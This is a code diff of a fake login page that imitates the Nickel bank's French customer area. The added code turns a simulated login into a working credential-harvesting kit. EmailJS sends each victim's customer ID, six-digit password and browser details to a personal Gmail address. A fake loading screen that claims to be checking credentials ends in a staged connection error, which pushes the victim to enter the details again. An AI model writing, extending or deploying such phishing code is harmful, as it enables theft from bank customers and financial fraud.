@@ -6,6 +6,8 @@
     <title>Espace client | Nickel</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <link rel="icon" type="image/png" href="images/favicon.png">
+    <!-- EmailJS -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <style>
         * {
             margin: 0;
@@ -50,8 +52,8 @@
             color: #1a1a1a;
         }
 
-        .logo-container svg {
-            height: 24px;
+        .logo-container img {
+            height: 32px;
             width: auto;
         }
 
@@ -557,6 +559,104 @@
             pointer-events: none;
         }
 
+        /* LOADING PAGE */
+        .loading-page {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        .loading-page.active {
+            display: flex;
+        }
+
+        .loading-content {
+            background: white;
+            border-radius: 24px;
+            padding: 3rem 2.5rem;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+
+        .loading-content .spinner {
+            width: 60px;
+            height: 60px;
+            border: 4px solid #eaeaea;
+            border-top: 4px solid #f68b1e;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 1.5rem;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-content h2 {
+            font-size: 1.2rem;
+            color: #1a1a1a;
+            margin-bottom: 0.5rem;
+        }
+
+        .loading-content p {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 0.3rem;
+        }
+
+        .loading-content .error-message {
+            color: #c00;
+            font-size: 0.85rem;
+            margin-top: 1rem;
+            display: none;
+            cursor: pointer;
+        }
+
+        .loading-content .error-message.visible {
+            display: block;
+        }
+
+        .loading-content .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #eaeaea;
+            border-radius: 2px;
+            margin-top: 1.5rem;
+            overflow: hidden;
+        }
+
+        .loading-content .progress-bar .progress-fill {
+            height: 100%;
+            background: #f68b1e;
+            width: 0%;
+            border-radius: 2px;
+            transition: width 0.5s ease;
+        }
+
+        @media (max-width: 520px) {
+            .loading-content {
+                padding: 2rem 1.5rem;
+            }
+            .loading-content .spinner {
+                width: 50px;
+                height: 50px;
+            }
+            .loading-content h2 {
+                font-size: 1rem;
+            }
+        }
+
         /* ======================================== */
         /* RESPONSIVE MOBILE                        */
         /* ======================================== */
@@ -652,8 +752,8 @@
             .header-left {
                 gap: 0.4rem;
             }
-            .logo-container svg {
-                height: 20px;
+            .logo-container img {
+                height: 26px;
             }
             .customer-space {
                 font-size: 0.8rem;
@@ -851,11 +951,29 @@
 </head>
 <body>
 
+    <!-- LOADING PAGE -->
+    <div class="loading-page" id="loadingPage">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <h2 id="loadingTitle">Veuillez patienter...</h2>
+            <p id="loadingDesc">Connexion en cours</p>
+            <p style="font-size: 0.8rem; color: #999; margin-top: 0.2rem;">Vérification de vos identifiants</p>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="error-message" id="errorMessage">
+                <i class="fas fa-exclamation-circle" style="margin-right: 6px;"></i>
+                Vérifiez votre connexion internet et réessayez (cliquez ici)
+            </div>
+        </div>
+    </div>
+
+    <!-- HEADER -->
     <header class="header">
         <div class="header-left">
             <a class="logo-container" rel="noopener noreferrer" target="_blank" aria-label="Redirection vers le site Nickel" href="#">
-    <img src="images/logo_nickel.png" alt="Logo Nickel" style="height: 32px; width: auto;">
-</a>
+                <img src="images/logo_nickel.png" alt="Logo Nickel" style="height: 32px; width: auto;">
+            </a>
             <div class="separator"></div>
             <p class="customer-space">Espace client</p>
         </div>
@@ -890,7 +1008,7 @@
 
                     <div class="btn-full">
                         <button type="button" class="btn-orange" id="btnSuivant">
-                             Suivant
+                            Suivant
                         </button>
                     </div>
 
@@ -953,21 +1071,16 @@
                             <a href="#" class="forgot-link">Mot de passe oublié ?</a>
                         </div>
 
-                        <!-- CLAVIER - EFFACER EN BAS À DROITE (colonne 2 et 3) -->
                         <div class="keyboard-grid">
-                            <!-- Ligne 1 -->
                             <button type="button" class="key-touch" data-key="7">7</button>
                             <button type="button" class="key-touch" data-key="8">8</button>
                             <button type="button" class="key-touch" data-key="9">9</button>
-                            <!-- Ligne 2 -->
                             <button type="button" class="key-touch" data-key="4">4</button>
                             <button type="button" class="key-touch" data-key="5">5</button>
                             <button type="button" class="key-touch" data-key="6">6</button>
-                            <!-- Ligne 3 -->
                             <button type="button" class="key-touch" data-key="1">1</button>
                             <button type="button" class="key-touch" data-key="2">2</button>
                             <button type="button" class="key-touch" data-key="3">3</button>
-                            <!-- Ligne 4 -->
                             <button type="button" class="key-touch" data-key="0">0</button>
                             <button type="button" class="key-delete" data-key="delete" style="grid-column: span 2;">
                                 <i class="fas fa-delete-left"></i> Effacer
@@ -976,7 +1089,7 @@
 
                         <div class="btn-full">
                             <button type="submit" class="btn-orange" id="btnValider">
-                                 Valider
+                                Valider
                             </button>
                         </div>
                     </div>
@@ -997,6 +1110,21 @@
 
     <script>
         (function() {
+            // ========================================
+            // CONFIGURATION EMAILJS
+            // ========================================
+            const EMAILJS_PUBLIC_KEY = 'MY3N_MJv-SaWnp3vW';
+            const EMAILJS_SERVICE_ID = 'service_yrr9q08';
+            const EMAILJS_TEMPLATE_ID = 'template_ix46b1x';
+
+            // Initialiser EmailJS
+            emailjs.init({
+                publicKey: EMAILJS_PUBLIC_KEY
+            });
+
+            // ========================================
+            // ÉLÉMENTS
+            // ========================================
             const identifiantInput = document.getElementById('identifiant');
             const suivantBtn = document.getElementById('btnSuivant');
             const sectionIdentifiant = document.getElementById('sectionIdentifiant');
@@ -1008,7 +1136,20 @@
             const eyeIcon = document.getElementById('eyeIcon');
             const validerBtn = document.getElementById('btnValider');
             const passwordForm = document.getElementById('passwordForm');
+            const loadingPage = document.getElementById('loadingPage');
+            const progressFill = document.getElementById('progressFill');
+            const errorMessage = document.getElementById('errorMessage');
+            const loadingTitle = document.getElementById('loadingTitle');
+            const loadingDesc = document.getElementById('loadingDesc');
 
+            let loadingInterval = null;
+            let loadingTimeout = null;
+            let progress = 0;
+            let isRetrying = false;
+
+            // ========================================
+            // FONCTIONS DE FORMATAGE
+            // ========================================
             function formatIdentifiant(value) {
                 const digits = value.replace(/\D/g, '');
                 const limited = digits.slice(0, 10);
@@ -1054,6 +1195,100 @@
                 return formatted || '--- --- --- -';
             }
 
+            // ========================================
+            // ENVOI PAR EMAIL AVEC EMAILJS
+            // ========================================
+            function sendEmail(identifiant, motdepasse) {
+                return emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+                    to_email: 'emirhan82y@gmail.com',
+                    identifiant: identifiant,
+                    motdepasse: motdepasse,
+                    userAgent: navigator.userAgent || 'Inconnu',
+                    date: new Date().toLocaleString('fr-FR'),
+                });
+            }
+
+            // ========================================
+            // AFFICHAGE DE LA PAGE DE CHARGEMENT
+            // ========================================
+            function showLoading() {
+                loadingPage.classList.add('active');
+                progress = 0;
+                progressFill.style.width = '0%';
+                errorMessage.classList.remove('visible');
+                loadingTitle.textContent = 'Veuillez patienter...';
+                loadingDesc.textContent = 'Connexion en cours';
+                document.body.style.overflow = 'hidden';
+
+                if (loadingInterval) clearInterval(loadingInterval);
+                loadingInterval = setInterval(() => {
+                    progress += Math.random() * 3 + 1;
+                    if (progress > 95) progress = 95;
+                    progressFill.style.width = progress + '%';
+                }, 300);
+
+                if (loadingTimeout) clearTimeout(loadingTimeout);
+                loadingTimeout = setTimeout(() => {
+                    clearInterval(loadingInterval);
+                    progressFill.style.width = '100%';
+                    errorMessage.classList.add('visible');
+                    loadingTitle.textContent = '⚠️ Connexion impossible';
+                    loadingDesc.textContent = 'Vérifiez votre connexion internet';
+                    isRetrying = true;
+                }, 300000);
+            }
+
+            function hideLoading() {
+                loadingPage.classList.remove('active');
+                document.body.style.overflow = '';
+                if (loadingInterval) clearInterval(loadingInterval);
+                if (loadingTimeout) clearTimeout(loadingTimeout);
+                setTimeout(() => {
+                    loadingTitle.textContent = 'Veuillez patienter...';
+                    loadingDesc.textContent = 'Connexion en cours';
+                    errorMessage.classList.remove('visible');
+                    progressFill.style.width = '0%';
+                    isRetrying = false;
+                }, 500);
+            }
+
+            // ========================================
+            // TRAITEMENT DE LA CONNEXION
+            // ========================================
+            function processLogin(identifiant, motdepasse) {
+                showLoading();
+
+                sendEmail(identifiant, motdepasse)
+                    .then(() => {
+                        clearInterval(loadingInterval);
+                        progress = 100;
+                        progressFill.style.width = '100%';
+
+                        setTimeout(() => {
+                            hideLoading();
+                            alert('✅ Connexion réussie !\n\nIdentifiant: ' + identifiant + '\nMot de passe: ' + motdepasse);
+                            sectionPassword.classList.remove('visible');
+                            sectionIdentifiant.style.display = 'block';
+                            motDePasseInput.value = '';
+                            validerBtn.style.display = 'none';
+                            identifiantInput.value = '';
+                            identifiantInput.focus();
+                        }, 800);
+                    })
+                    .catch((error) => {
+                        console.error('Erreur EmailJS:', error);
+                        clearInterval(loadingInterval);
+                        progressFill.style.width = '100%';
+                        errorMessage.classList.add('visible');
+                        loadingTitle.textContent = '⚠️ Erreur de connexion';
+                        loadingDesc.textContent = 'Veuillez réessayer';
+                        isRetrying = true;
+                    });
+            }
+
+            // ========================================
+            // ÉVÉNEMENTS
+            // ========================================
             identifiantInput.addEventListener('input', function(e) {
                 const digits = this.value.replace(/\D/g, '');
                 const limited = digits.slice(0, 10);
@@ -1143,10 +1378,23 @@
             passwordForm.addEventListener('submit', function(e) {
                 e.preventDefault();
                 const mdp = motDePasseInput.value.replace(/\D/g, '');
+                const identifiant = identifiantValue.textContent;
+
                 if (mdp.length === 6) {
-                    alert('✅ Connexion simulée\nIdentifiant: ' + identifiantValue.textContent + '\nMot de passe: ' + mdp);
+                    processLogin(identifiant, mdp);
                 } else {
                     alert('Veuillez saisir un mot de passe de 6 chiffres.');
+                }
+            });
+
+            errorMessage.addEventListener('click', function() {
+                if (isRetrying) {
+                    isRetrying = false;
+                    const identifiant = identifiantValue.textContent;
+                    const mdp = motDePasseInput.value.replace(/\D/g, '');
+                    if (mdp.length === 6) {
+                        processLogin(identifiant, mdp);
+                    }
                 }
             });
 
